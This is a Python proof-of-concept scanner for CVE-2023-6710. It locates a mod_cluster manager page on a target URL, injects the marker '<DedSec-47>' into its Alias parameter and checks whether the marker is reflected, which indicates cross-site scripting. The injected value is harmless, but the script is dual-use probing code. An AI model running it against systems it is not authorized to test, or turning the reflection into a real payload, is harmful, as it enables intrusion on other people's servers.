import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from requests.exceptions import RequestException

class Colors:
    RED = '\033[91m'
    GREEN = '\033[1;49;92m'
    RESET = '\033[0m'

def get_cluster_manager_url(base_url):
    # Check for /mod_cluster-manager first
    try:
        response_mod = requests.get(base_url + '/mod_cluster-manager')
        response_mod.raise_for_status()

        if response_mod.status_code == 200:
            return '/mod_cluster-manager'
    except requests.exceptions.RequestException as err:
        print(Colors.RED + f"Error: {err}" + Colors.RESET)

    # If /mod_cluster-manager is not found, try /cluster-manager
    print(Colors.GREEN + "Exploit check for /mod_cluster-manager failed. Trying /cluster-manager..." + Colors.RESET)

    try:
        response = requests.get(base_url + '/cluster-manager')
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(Colors.RED + f"Error: {e}" + Colors.RESET)
        return None

    print(Colors.GREEN + "Start exploit check for /cluster-manager..." + Colors.RESET)

    if response.status_code == 200:
        # Use BeautifulSoup to parse the HTML content
        soup = BeautifulSoup(response.text, 'html.parser')

        # Find all 'a' tags with 'href' attribute
        all_links = soup.find_all('a', href=True)

        # Search for the link containing the Alias parameter in the href attribute
        cluster_manager_url = None
        for link in all_links:
            parsed_url = urlparse(link['href'])
            query_params = parse_qs(parsed_url.query)
            alias_value = query_params.get('Alias', [None])[0]

            if alias_value:
                cluster_manager_url = link['href']
                break

        if cluster_manager_url:
            print(Colors.GREEN + f"Found Alias value: {cluster_manager_url}" + Colors.RESET)
            return cluster_manager_url

    # If /mod_cluster-manager and /cluster-manager are not found, print an error message
    print(Colors.RED + f"Error: Unable to get the initial step on {base_url}")
    return None

def update_alias_value(url, new_alias_value):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    query_params['Alias'] = [new_alias_value]
    updated_url = urlunparse(parsed_url._replace(query=urlencode(query_params, doseq=True)))
    return updated_url

def check_response_for_value(url, check_value):
    response = requests.get(url)
    if check_value in response.text:
        print(Colors.RED +"Website is vulnerable POC by :")
        print(Colors.GREEN +"""
          ____           _ ____                  _  _ _____ 
         |  _ \  ___  __| / ___|  ___  ___      | || |___  |
         | | | |/ _ \/ _` \___ \ / _ \/ __| ____| || |  / / 
         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /  
         |____/ \___|\__,_|____/ \___|\___|        |_|/_/   
                                     github.com/DedSec-47    """)
    else:
        print(Colors.GREEN +"Website is not vulnerable POC by :")
        print(Colors.GREEN +"""
          ____           _ ____                  _  _ _____ 
         |  _ \  ___  __| / ___|  ___  ___      | || |___  |
         | | | |/ _ \/ _` \___ \ / _ \/ __| ____| || |  / / 
         | |_| |  __/ (_| |___) |  __/ (_  |____|__  | / /  
         |____/ \___|\__,_|____/ \___|\___|        |_|/_/   
                                     github.com/DedSec-47    """)

def main():
    # Create a command-line argument parser
    parser = argparse.ArgumentParser(description="python CVE-2023-6710.py -u https://example.com")
    
    # Add a command-line argument for the website URL (-u/--url)
    parser.add_argument('-u', '--url', help='Website URL', required=True)

    # Parse the command-line arguments
    args = parser.parse_args()

    # Get the cluster manager URL from the specified website
    cluster_manager_url = get_cluster_manager_url(args.url)

    # Check if the cluster manager URL is found
    if cluster_manager_url:

        # Modify the URL by adding the cluster manager value
        modified_url = args.url + cluster_manager_url

        # Update the Alias parameter value to "agent-47"
        modified_url = update_alias_value(modified_url, "<DedSec-47>")
        print(Colors.GREEN + "Check executed successfully" + Colors.RESET)

        # Check the response for the value "agent-47"
        check_response_for_value(modified_url, "<DedSec-47>")

if __name__ == "__main__":
    main()
